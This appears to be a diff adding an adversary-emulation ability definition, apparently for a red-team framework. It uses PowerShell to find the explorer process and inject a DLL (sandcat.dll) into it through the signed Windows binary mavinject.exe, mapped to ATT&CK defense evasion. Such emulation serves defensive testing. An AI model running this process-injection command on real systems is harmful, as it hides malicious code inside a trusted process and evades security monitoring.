@@ -1,0 +1,15 @@
+---
+
+- id: e5bcefee-262d-4568-a261-e8a20855ec81
+  name: Signed Binary Execution - Mavinject
+  description: Leverage Mavinject (signed binary) for DLL injection
+  tactic: defense-evasion
+  technique:
+    attack_id: T1055.002
+    name: "Process Injection: Portable Executable Injection"
+  platforms:
+    windows:
+      psh:
+        command: |
+            $explorer = Get-Process -Name explorer;
+            mavinject.exe $explorer.id C:\Users\Public\sandcat.dll
